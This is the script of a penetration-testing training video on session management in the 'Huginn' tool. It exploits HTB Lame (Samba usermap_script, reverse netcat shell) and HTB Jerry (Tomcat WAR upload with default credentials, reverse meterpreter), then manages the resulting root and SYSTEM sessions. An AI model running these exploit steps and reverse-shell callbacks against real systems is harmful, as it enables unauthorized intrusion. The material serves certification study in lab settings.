# VIDEO 45: Session Management
### Multi-Session Support, Session Types & Host Tracking
**Suggested length:** 16–18 minutes
**License Tier:** Enterprise (Post-Exploitation Framework)
**Certification Relevance:** OSCP: Post-Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:30)

**[Screen: Huginn splash screen with Section 8 title card "Post-Exploitation and Privilege Escalation"]**

> "Welcome to Section 8 — Post-Exploitation and Privilege Escalation. This is the Elevate phase of the attack chain. In Video 40, we used Hacking Mode to establish our first session on a target (see Video 40: Hacking Mode). Now we go deeper. This video covers Session Management — how to juggle multiple active sessions across different hosts, work with different shell types, and track everything in a single unified interface."

**[Screen: Warning banner — red background with white text: "⚠️ LAB ENVIRONMENT ONLY — AUTHORIZED TESTING ONLY"]**

> "Before we touch anything — mandatory ethics statement. Post-exploitation means you have already gained access to a system. Using these techniques on any system without explicit written authorization is a serious criminal offense. Everything you see in this video targets isolated Hack The Box lab machines — HTB Lame and HTB Jerry — both designed specifically for penetration testing practice. In a professional engagement, post-exploitation only happens after scope agreements, rules of engagement, and legal contracts are in place. Never perform post-exploitation activities outside of authorized lab environments or contractually scoped engagements."

**[Screen: Enterprise tier badge prominently displayed with feature list]**

> "Session Management is an Enterprise tier feature, part of Huginn's Post-Exploitation Framework. This means you need an active Enterprise license to follow along. If you're on the Free or Professional tier, this video still provides valuable methodology knowledge for understanding how session management works in professional tooling. Let's get into it."

---

## SECTION 1: Session Management Architecture (1:30 – 3:30)

**[Screen: Architecture diagram showing SessionManager, ShellManager, ListenerManager, and PostExploitationFramework — with data flow arrows between components]**

> "Session management in Huginn is built on four interconnected components. The SessionManager is the orchestrator — it creates sessions, assigns unique IDs, tracks which sessions belong to which targets, maintains command history, and handles persistence across application restarts. The ShellManager handles the actual shell connections — reverse shells, bind shells, SSH sessions, and Telnet connections. The ListenerManager opens ports, accepts incoming callbacks, and registers new connections as they arrive. And the PostExploitationFramework ties it all together, providing the interaction layer for running commands, enumerating systems, and extracting data through active sessions."

**[Screen: Code architecture diagram — SessionManager.create_session() → ShellManager.create_reverse_shell_listener() → ListenerManager.create_listener() → ListenerManager.register_session()]**

> "Here's the flow. When you initiate exploitation, SessionManager creates a new session record. ShellManager requests a listener from ListenerManager — opening a port for the callback. When the exploit fires and the target connects back, ListenerManager's accept loop catches the connection, registers it as a Session object, and ShellManager wraps it with an interactive interface. SessionManager then updates the session record with connection details — target IP, shell type, user context, and timestamps. Each session gets a unique ID like SES-001, and every command you run is logged with input, output, and timing."

**[Screen: Huginn UI — Session Info page showing the sessions panel with columns: ID, Type, Target, User, Status, Duration]**

> "In the UI, sessions live under the Session Info page in the Elevate section of the sidebar. The main panel shows all sessions in a table with sortable columns — session ID, shell type, target address, user context, connection status, and duration. Active sessions show a green indicator, backgrounded sessions show yellow, and terminated sessions show grey. Let's set up our first session."

---

## SECTION 2: Lab Environment Setup (3:30 – 5:30)

**[Screen: HTB VPN connection status — showing tun0 interface active, HTB machine spawn panel with Lame and Jerry]**

> "For this demonstration, we need two HTB machines running simultaneously to show multi-session management. We're using HTB Lame at 10.10.10.3 and HTB Jerry at 10.10.10.95. Lame gives us SSH and SMB exploitation paths. Jerry runs Apache Tomcat on port 8080 with default credentials. Both are Easy difficulty machines — the point here isn't the exploitation, it's managing what comes after."

```bash
# Lab Environment Setup
# ═════════════════════
#
# HTB VPN Connection:
# ┌──────────────────────────────────────────┐
# │ Interface: tun0                          │
# │ IP Address: 10.10.14.12                  │
# │ Status: Connected to HTB EU-Free-1       │
# └──────────────────────────────────────────┘
#
# Target Machines:
# ┌──────────────┬─────────────┬─────────────────────────────┐
# │ Machine      │ IP Address  │ Expected Services           │
# ├──────────────┼─────────────┼─────────────────────────────┤
# │ Lame         │ 10.10.10.3  │ SSH (22), SMB (139/445)     │
# │ Jerry        │ 10.10.10.95 │ Tomcat (8080)               │
# └──────────────┴─────────────┴─────────────────────────────┘
#
# Verify connectivity:
ping -c 1 10.10.10.3
# PING 10.10.10.3: 64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=42.3 ms

ping -c 1 10.10.10.95
# PING 10.10.10.95: 64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=38.7 ms
```

**[Screen: Huginn Listener Configuration panel — setting up two listeners on ports 4444 and 4445]**

> "We'll set up two listeners — one on port 4444 for the Lame callback and one on port 4445 for Jerry. This mirrors real-world engagements where you maintain separate listeners per target for clean session tracking."

```bash
# Listener Setup in Huginn
# ════════════════════════
#
# Listener 1 (for Lame):
# [*] Creating listener on 0.0.0.0:4444
# [*] Listener type: reverse_tcp
# [*] Listener ID: LST-f4a1b2c3
# [+] Listener active — waiting for connections
#
# Listener 2 (for Jerry):
# [*] Creating listener on 0.0.0.0:4445
# [*] Listener type: reverse_tcp
# [*] Listener ID: LST-d7e8f9a0
# [+] Listener active — waiting for connections
#
# Active Listeners:
# ┌─────────────┬──────┬────────────┬──────────┬──────────┐
# │ Listener ID │ Port │ Type       │ Sessions │ Status   │
# ├─────────────┼──────┼────────────┼──────────┼──────────┤
# │ LST-f4a1b2c3│ 4444 │ reverse_tcp│ 0        │ Active   │
# │ LST-d7e8f9a0│ 4445 │ reverse_tcp│ 0        │ Active   │
# └─────────────┴──────┴────────────┴──────────┴──────────┘
```

---

## SECTION 3: Establishing the First Session — HTB Lame (5:30 – 8:00)

**[Screen: Huginn Hacking Mode — Module configuration for Lame exploitation via SMB (Samba 3.0.20 username map script)]**

> "Let's establish our first session. Lame runs Samba 3.0.20, which is vulnerable to the username map script command execution — CVE-2007-2447. This is the same machine we enumerated back in Video 7 (see Video 7: SMB Enumeration). The exploit is straightforward — inject a command through the SMB username field that spawns a reverse shell."

```bash
# Exploit Configuration — HTB Lame (CVE-2007-2447)
# ═════════════════════════════════════════════════
#
# Module: exploit/multi/samba/usermap_script
#
# Required Options:
# ┌──────────────┬─────────────────┬──────────────────────────────┐
# │ Option       │ Value           │ Description                  │
# ├──────────────┼─────────────────┼──────────────────────────────┤
# │ RHOSTS       │ 10.10.10.3      │ Target (HTB Lame)            │
# │ RPORT        │ 139             │ Samba port                   │
# │ LHOST        │ 10.10.14.12     │ Callback address (tun0)      │
# │ LPORT        │ 4444            │ Callback port                │
# └──────────────┴─────────────────┴──────────────────────────────┘
#
# Payload: cmd/unix/reverse_netcat
```

**[Screen: Huginn showing exploit execution — real-time output log for Lame]**

```bash
# Exploit Execution — Lame
# ════════════════════════
#
# [*] Started reverse TCP handler on 10.10.14.12:4444
# [*] 10.10.10.3:139 - Attempting to trigger Samba usermap_script vuln...
# [*] Command shell session 1 opened (10.10.14.12:4444 → 10.10.10.3:43218)
# [+] 10.10.10.3:139 - ════════════════════════════════════════
# [+] 10.10.10.3:139 - Session established — command shell
# [+] 10.10.10.3:139 - ════════════════════════════════════════
```

**[Screen: Huginn Sessions panel — showing SES-001 registered with root access on Lame]**

> "Session one is live. Let's verify what we have."

```bash
# Session Verification — SES-001
# ═══════════════════════════════
#
huginn session SES-001> whoami
# root

huginn session SES-001> hostname
# lame

huginn session SES-001> id
# uid=0(root) gid=0(root)

huginn session SES-001> ip addr show eth0
# inet 10.10.10.3/24 brd 10.10.10.255 scope global eth0
```

**[Screen: Huginn session details panel — SES-001: Type: command_shell, Target: 10.10.10.3, User: root, Status: Active, Duration: 0:00:23]**

> "We have root on Lame. Session SES-001 is a basic command shell — it's functional but lacks the interactive features of Meterpreter. Notice the session type shows command_shell. This is important because different session types have different capabilities. A basic shell gives you command execution, but Meterpreter or SSH sessions provide file transfer, port forwarding, and built-in enumeration. We'll keep this session alive and move to our second target."

---

## SECTION 4: Establishing the Second Session — HTB Jerry (8:00 – 10:30)

**[Screen: Huginn Hacking Mode — switching to configure exploit for Jerry (Tomcat manager deployment)]**

> "Now for session number two. HTB Jerry runs Apache Tomcat 7 on port 8080 with default credentials — tomcat:s3cret on the Manager application. We'll deploy a WAR file containing a reverse shell payload. This demonstrates a completely different exploitation vector — web application access leading to code execution."

```bash
# Exploit Configuration — HTB Jerry (Tomcat Manager WAR Upload)
# ═════════════════════════════════════════════════════════════
#
# Module: exploit/multi/http/tomcat_mgr_upload
#
# Required Options:
# ┌──────────────┬─────────────────┬──────────────────────────────┐
# │ Option       │ Value           │ Description                  │
# ├──────────────┼─────────────────┼──────────────────────────────┤
# │ RHOSTS       │ 10.10.10.95     │ Target (HTB Jerry)           │
# │ RPORT        │ 8080            │ Tomcat HTTP port             │
# │ HttpUsername │ tomcat          │ Manager credentials          │
# │ HttpPassword │ s3cret          │ Manager credentials          │
# │ LHOST        │ 10.10.14.12     │ Callback address (tun0)      │
# │ LPORT        │ 4445            │ Callback port (listener 2)   │
# └──────────────┴─────────────────┴──────────────────────────────┘
#
# Payload: java/meterpreter/reverse_tcp
```

**[Screen: Huginn showing exploit execution output for Jerry]**

```bash
# Exploit Execution — Jerry
# ═════════════════════════
#
# [*] Started reverse TCP handler on 10.10.14.12:4445
# [*] 10.10.10.95:8080 - Retrieving session ID and CSRF token...
# [*] 10.10.10.95:8080 - Uploading WAR file (1593 bytes)...
# [*] 10.10.10.95:8080 - Executing payload...
# [*] Sending stage (58851 bytes) to 10.10.10.95
# [*] Meterpreter session 2 opened (10.10.14.12:4445 → 10.10.10.95:49190)
# [+] 10.10.10.95:8080 - ════════════════════════════════════════
# [+] 10.10.10.95:8080 - WIN! Meterpreter session established
# [+] 10.10.10.95:8080 - ════════════════════════════════════════
```

**[Screen: Huginn Sessions panel now showing TWO active sessions — SES-001 (Lame/root) and SES-002 (Jerry/SYSTEM)]**

> "Two sessions active simultaneously. Let's verify the second one."

```bash
# Session Verification — SES-002
# ═══════════════════════════════
#
huginn session SES-002> getuid
# Server username: NT AUTHORITY\SYSTEM

huginn session SES-002> sysinfo
# Computer    : JERRY
# OS          : Windows Server 2012 R2 (6.3 Build 9600)
# Architecture: x64
# Meterpreter : x86/windows

huginn session SES-002> ipconfig
# Interface 12 (Intel PRO/1000 MT)
# ─────────────────────────────────
# IPv4 Address: 10.10.10.95
# Subnet Mask:  255.255.255.0
```

**[Screen: Huginn session details for SES-002 — Type: meterpreter, Target: 10.10.10.95, User: NT AUTHORITY\SYSTEM, Status: Active]**

> "SYSTEM on Jerry. Notice the session type here is meterpreter — a fully featured interactive shell with file operations, network pivoting, and process manipulation. This is different from SES-001 which is a basic command shell. Now we have two fundamentally different session types on two different operating systems — Linux root on Lame and Windows SYSTEM on Jerry — managed from a single interface. This is the power of multi-session management."

---

## SECTION 5: Multi-Session Management Operations (10:30 – 13:00)

**[Screen: Huginn Sessions panel — full table view showing both sessions with management toolbar]**

> "With multiple sessions active, you need to switch between them fluidly. Huginn provides several management operations — listing, interacting, backgrounding, renaming, and terminating sessions. Let's walk through each one."

```bash
# Multi-Session Management
# ════════════════════════
#
# List all sessions:
huginn sessions> list
# ┌────────┬────────────────┬─────────────┬──────────────────────┬────────┬──────────┐
# │ ID     │ Type           │ Target      │ User                 │ Status │ Duration │
# ├────────┼────────────────┼─────────────┼──────────────────────┼────────┼──────────┤
# │ SES-001│ command_shell   │ 10.10.10.3  │ root                 │ Active │ 4:23     │
# │ SES-002│ meterpreter    │ 10.10.10.95 │ NT AUTHORITY\SYSTEM  │ Active │ 1:47     │
# └────────┴────────────────┴─────────────┴──────────────────────┴────────┴──────────┘
#
# Switch to a session:
huginn sessions> interact SES-001
# [*] Interacting with session SES-001 (10.10.10.3 — root)
root@lame:/# 

# Background current session:
huginn session SES-001> background
# [*] Backgrounding session SES-001...
# [*] Session SES-001 remains active in background

# Switch to other session:
huginn sessions> interact SES-002
# [*] Interacting with session SES-002 (10.10.10.95 — SYSTEM)
meterpreter >
```

**[Screen: Huginn showing session rename dialog — renaming SES-001 to "Lame-Root" and SES-002 to "Jerry-SYSTEM"]**

> "In complex engagements with ten or twenty sessions, raw IDs get confusing fast. Huginn lets you rename sessions for clarity. I'll tag these — SES-001 becomes 'Lame-Root' and SES-002 becomes 'Jerry-SYSTEM'. Now when you list sessions, the names tell you exactly where you are and what access level you have."

```bash
# Rename sessions for clarity:
huginn sessions> rename SES-001 "Lame-Root"
# [+] Session SES-001 renamed to "Lame-Root"

huginn sessions> rename SES-002 "Jerry-SYSTEM"
# [+] Session SES-002 renamed to "Jerry-SYSTEM"

# List with names:
huginn sessions> list
# ┌────────┬────────────────┬─────────────┬──────────────────┬────────────────┐
# │ ID     │ Name           │ Target      │ User             │ Status         │
# ├────────┼────────────────┼─────────────┼──────────────────┼────────────────┤
# │ SES-001│ Lame-Root      │ 10.10.10.3  │ root             │ Active         │
# │ SES-002│ Jerry-SYSTEM   │ 10.10.10.95 │ NT AUTHORITY\SYS │ Active         │
# └────────┴────────────────┴─────────────┴──────────────────┴────────────────┘
```

**[Screen: Huginn session statistics panel — showing command count, bytes transferred, connection duration for each session]**

> "The statistics panel tracks operational metrics per session — commands executed, bytes sent and received, connection uptime, and last activity timestamp. This is useful for reporting — documenting exactly how long you maintained access and what actions were performed. SessionManager persists all of this, including full command history with timestamps, so your penetration test report has precise timelines."

```bash
# Session Statistics:
huginn sessions> stats SES-001
# ┌─────────────────────────┬────────────────────────┐
# │ Session ID              │ SES-001 (Lame-Root)    │
# │ Connection Type         │ command_shell           │
# │ Target                  │ 10.10.10.3             │
# │ Connected Since         │ 2024-01-15 14:32:07    │
# │ Duration                │ 5m 42s                 │
# │ Commands Executed       │ 4                      │
# │ Bytes Sent              │ 128                    │
# │ Bytes Received          │ 2,341                  │
# │ Last Activity           │ 2024-01-15 14:37:49    │
# └─────────────────────────┴────────────────────────┘
```

---

## SECTION 6: Session Types and Shell Upgrades (13:00 – 15:00)

**[Screen: Huginn diagram showing session type hierarchy — basic shell → stabilized shell → Meterpreter, with capability differences listed]**

> "Not all sessions are equal. Huginn recognizes four primary session types, each with different capabilities. Basic command shells give you raw command execution but no file transfer, no tab completion, no job control. SSH sessions give you a proper PTY with full interactive features. Meterpreter sessions provide the richest feature set — file upload and download, screenshot capture, keylogging, process migration, and network pivoting. Bind shells are outbound connections you initiate rather than callbacks."

```bash
# Session Type Comparison
# ═══════════════════════
#
# ┌───────────────────┬────────┬──────────┬────────────┬───────────┐
# │ Capability        │ Basic  │ SSH      │ Meterpreter│ Bind Shell│
# ├───────────────────┼────────┼──────────┼────────────┼───────────┤
# │ Command Execution │ ✓      │ ✓        │ ✓          │ ✓         │
# │ Tab Completion    │ —      │ ✓        │ ✓          │ —         │
# │ File Transfer     │ —      │ ✓ (SCP)  │ ✓ (upload/ │ —         │
# │                   │        │          │  download) │           │
# │ Port Forwarding   │ —      │ ✓        │ ✓          │ —         │
# │ Process Migration │ —      │ —        │ ✓          │ —         │
# │ Pivoting          │ —      │ ✓ (SOCKS)│ ✓          │ —         │
# │ Job Control       │ —      │ ✓        │ ✓          │ —         │
# │ Encrypted Channel │ —      │ ✓        │ Optional   │ —         │
# └───────────────────┴────────┴──────────┴────────────┴───────────┘
```

**[Screen: Huginn showing shell upgrade workflow — upgrading SES-001 from basic shell to stabilized shell]**

> "Our Lame session is a basic command shell — functional but limited. Let's stabilize it. Huginn's ShellManager provides automated shell stabilization using Python PTY spawning. This gives us proper terminal handling — arrow keys work, Ctrl+C doesn't kill the session, and we get a proper prompt."

```bash
# Shell Stabilization — SES-001
# ══════════════════════════════
#
huginn session SES-001> upgrade --stabilize
# [*] Attempting shell stabilization on SES-001...
# [*] Trying Python PTY method...
# [*] Executing: python -c 'import pty; pty.spawn("/bin/bash")'
# [+] Shell stabilized — interactive TTY established
# [*] Setting terminal type: export TERM=xterm
# [*] Setting shell: export SHELL=/bin/bash
# [+] Session SES-001 upgraded: command_shell → stabilized_shell
#
root@lame:/# export TERM=xterm
root@lame:/# stty rows 40 cols 120
root@lame:/#
```

**[Screen: Huginn sessions panel updated — SES-001 now shows "stabilized_shell" type]**

> "Now SES-001 is stabilized. We can press arrow keys for command history, use tab completion, and run interactive programs like vim or top without the session breaking. For the Jerry session, we already have Meterpreter which has all these features built in. In engagements where you can't get Meterpreter — maybe AV is killing the stager — shell stabilization is your next best option."

---

## SECTION 7: Session Persistence and Export (15:00 – 16:30)

**[Screen: Huginn session export/save dialog — options for saving session state and command history]**

> "Sessions don't last forever. Network interruptions, target reboots, and timeout limits can kill your shell. Huginn's SessionManager provides persistence features to handle this. You can save session state — including command history, discovered artifacts, and connection metadata — to disk. If a session drops, you still have the record of everything you found."

```bash
# Session Persistence Operations
# ══════════════════════════════
#
# Save current session state:
huginn sessions> save --all
# [*] Saving session state...
# [+] SES-001 (Lame-Root): 4 commands, 2,341 bytes captured
# [+] SES-002 (Jerry-SYSTEM): 3 commands, 1,890 bytes captured
# [+] Sessions saved to: ~/.huginn/sessions/engagement-2024-01-15.json

# Export session history for reporting:
huginn sessions> export SES-001 --format json --output ./lame-session.json
# [+] Session SES-001 exported to ./lame-session.json
# [+] Includes: command history, timestamps, session metadata

huginn sessions> export SES-002 --format json --output ./jerry-session.json
# [+] Session SES-002 exported to ./jerry-session.json
```

**[Screen: Huginn showing session auto-reconnect configuration panel]**

> "Huginn also tracks session health. The session monitor thread runs in the background checking each session's heartbeat. If a session goes unresponsive, it's marked as 'stale' after 30 seconds and 'dead' after 60. For SSH sessions, Huginn can attempt automatic reconnection using cached credentials. For reverse shells, you'd need to re-trigger the exploit — but your listener is still running and ready to catch the callback."

```bash
# Session Health Monitoring
# ═════════════════════════
#
# Session status indicators:
# ● Active  — responding to heartbeat
# ● Stale   — no response for 30s (investigating)
# ● Dead    — no response for 60s (connection lost)
# ● Closed  — gracefully terminated by user
#
# Auto-reconnect (SSH sessions):
huginn sessions> reconnect SES-001
# [*] Attempting reconnection to 10.10.10.3...
# [+] Reconnected — session SES-001 restored
```

---

## SECTION 8: Host Tracking and Session Organization (16:30 – 17:30)

**[Screen: Huginn Host Tracking panel — showing discovered hosts with their associated sessions, services, and credentials]**

> "As your engagement grows, SessionManager integrates with Huginn's broader data model. Each session is linked to a host record — IP address, hostname, operating system, discovered services, and credentials found on that host. When you move to Credential Harvesting in the next video (see Video 46: Credential Harvesting), extracted credentials are automatically associated with the host where they were found."

```bash
# Host Tracking Integration
# ═════════════════════════
#
# Hosts with active sessions:
# ┌─────────────┬──────────┬──────────────────────┬──────────────┬──────────────┐
# │ Host        │ Hostname │ OS                   │ Sessions     │ Credentials  │
# ├─────────────┼──────────┼──────────────────────┼──────────────┼──────────────┤
# │ 10.10.10.3  │ lame     │ Ubuntu 8.04 (Linux)  │ SES-001      │ 0            │
# │ 10.10.10.95 │ JERRY    │ Windows Server 2012  │ SES-002      │ 1 (tomcat)   │
# └─────────────┴──────────┴──────────────────────┴──────────────┴──────────────┘
#
# Session-to-host relationship:
# Each session enriches the host record with:
#   - OS details from sysinfo/uname
#   - Network interfaces discovered
#   - Running services identified
#   - User accounts enumerated
#   - Credentials extracted
```

**[Screen: Huginn showing session credential sync — CredentialManager profile linked to current session]**

> "Huginn's CredentialManager syncs with the active session automatically. When you switch sessions, the credential profile updates to show credentials relevant to that host. Credentials found during post-exploitation — local account hashes, cached domain credentials, service account passwords — all feed back into the session record. This creates a live map of your access across the engagement, which directly feeds into your final report."

---

## SECTION 9: Certification Mapping and Practice (17:30 – 18:00)

**[Screen: Slide showing OSCP and CEH mapping for session management]**

> "Session management maps to OSCP's Post-Exploitation domain. On the exam, you'll be managing shells across multiple machines in a simulated corporate network — typically three to five targets. Understanding how to juggle sessions, stabilize shells, and keep your access alive while you enumerate is critical for time management. For CEH, this covers Module 5 — System Hacking, specifically the 'maintaining access' objective."

**[Screen: Practice recommendations — HTB machines for multi-session practice]**

> "For practice, try HTB Forest for multiple domain-joined sessions in an AD environment. THM's 'Wreath' network gives you a three-machine pivot chain requiring session management across hosts. And HTB Reel provides a multi-layered Windows environment where session juggling between user and admin contexts is essential."

---

## OUTRO (18:00 – end)

**[Screen: Summary slide — Session Management: Multi-Session Support | Session Types | Shell Stabilization | Host Tracking | Session Persistence | Next: Video 46 — Credential Harvesting]**

> "That covers Session Management. We established sessions on two different targets simultaneously — root on Linux and SYSTEM on Windows — from a single interface. We covered session types and their capability differences, shell stabilization for basic shells, multi-session switching, session persistence for reporting, and host tracking integration. In the next video, we take these sessions and use them to extract credentials — SAM dumps, LSA secrets, and NTDS.dit extraction on domain controllers. See you in Video 46."

